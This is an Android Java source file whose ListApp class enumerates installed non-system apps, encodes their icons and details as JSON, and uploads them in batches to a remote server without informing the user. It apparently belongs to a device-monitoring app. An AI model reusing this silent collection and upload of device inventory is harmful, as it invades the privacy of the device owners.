package com.inet.android.list;

import java.io.ByteArrayOutputStream;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;

import org.json.JSONException;
import org.json.JSONObject;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.drawable.BitmapDrawable;
import android.graphics.drawable.Drawable;
import android.preference.PreferenceManager;
import android.util.Base64;

import com.inet.android.bs.NetworkChangeReceiver;
import com.inet.android.request.ConstantValue;
import com.inet.android.request.RequestList;
import com.inet.android.utils.Logging;
import com.inet.android.utils.ValueWork;

/**
 * ListApp class is designed to get the list of applications
 * 
 * @author johny homicide
 * 
 */
@SuppressLint("NewApi")
public class ListApp {
	private Context mContext;
	private String complete;
	private static String LOG_TAG = ListApp.class.getSimpleName().toString();
	private final int COMPRESSION_QUALITY = 100;
	private int version;

	/**
	 * get the list of all installed applications in the device
	 * 
	 * @return ArrayList of installed applications or null
	 */
	@SuppressLint("NewApi")
	public void getListOfInstalledApp(Context context) {
		this.mContext = context;
		version = ValueWork.getMethod(ConstantValue.TYPE_LIST_APP, mContext);
		String sendStr = null;

		Logging.doLog(LOG_TAG, "getListOfInstalledApp", "getListOfInstalledApp");

		// -------initial json line----------------------
		JSONObject jsonAppList = new JSONObject();
		if (NetworkChangeReceiver.isOnline(context)) {
			int flags = PackageManager.GET_META_DATA
					| PackageManager.GET_SHARED_LIBRARY_FILES
					| PackageManager.GET_UNINSTALLED_PACKAGES;
			PackageManager packageManager = context.getPackageManager();
			final List<ApplicationInfo> installedApps = packageManager
					.getInstalledApplications(flags);

			for (ApplicationInfo app : installedApps) {
				if ((app.flags & ApplicationInfo.FLAG_SYSTEM) == 1) {
					// System application

				} else {
					try {
						PackageInfo packageInfo = packageManager
								.getPackageInfo(app.packageName,
										PackageManager.GET_PERMISSIONS);
						SimpleDateFormat dateFormat = new SimpleDateFormat(
								"yyyy-MM-dd HH:mm:ss");

						String installTime = dateFormat.format(new Date(
								packageInfo.firstInstallTime));
						// -----------get Icon
						// App-------------------------------------
						Drawable icon = packageInfo.applicationInfo
								.loadIcon(context.getPackageManager());
						String encodedImage = null;
						Bitmap bitmap = ((BitmapDrawable) icon).getBitmap();
						if (bitmap != null) {
							ByteArrayOutputStream byteArrayBitmapStream = new ByteArrayOutputStream();
							bitmap.compress(Bitmap.CompressFormat.PNG,
									COMPRESSION_QUALITY, byteArrayBitmapStream);
							byte[] b = byteArrayBitmapStream.toByteArray();
							encodedImage = Base64.encodeToString(b,
									Base64.DEFAULT);
							jsonAppList.put("icon", encodedImage);

						}
						// ------------------------------------------------------
						// Send Data
						// ------------------------------------------------------
						jsonAppList.put("name", app.loadLabel(packageManager));
						jsonAppList.put("dir", app.sourceDir);
						jsonAppList.put("time", installTime);
						jsonAppList.put("build", packageInfo.versionCode);

						if (sendStr == null)
							sendStr = jsonAppList.toString();
						else
							sendStr += "," + jsonAppList.toString();
						if (sendStr.length() >= 50000) {
							complete = "0";
							Logging.doLog(LOG_TAG, "str >= 50000",
									"str >= 50000");
							sendRequest(sendStr, complete);
							sendStr = null;

						}
					} catch (PackageManager.NameNotFoundException e) {
						e.printStackTrace();

					} catch (JSONException e) {
						Logging.doLog(LOG_TAG, "json сломался", "json сломался");

					}
				}
			}
			if (sendStr != null) {
				lastRaw(sendStr);
				sendStr = null;

			} else {
				lastRaw("");
				sendStr = null;
			}
		} else {
			TurnSendList.setList(ConstantValue.TYPE_LIST_APP, version, "0",
					mContext);
		}
	}

	private void lastRaw(String sendStr) {
		complete = "1";
		Logging.doLog(LOG_TAG, "Send complete 1 ..", "Send complete 1 ..");
		sendRequest(sendStr, complete);
	}

	private void sendRequest(String str, String complete) {
		RequestList.sendDemandRequest(str, ConstantValue.TYPE_LIST_APP_REQUEST,
				complete, version, mContext);
	}
}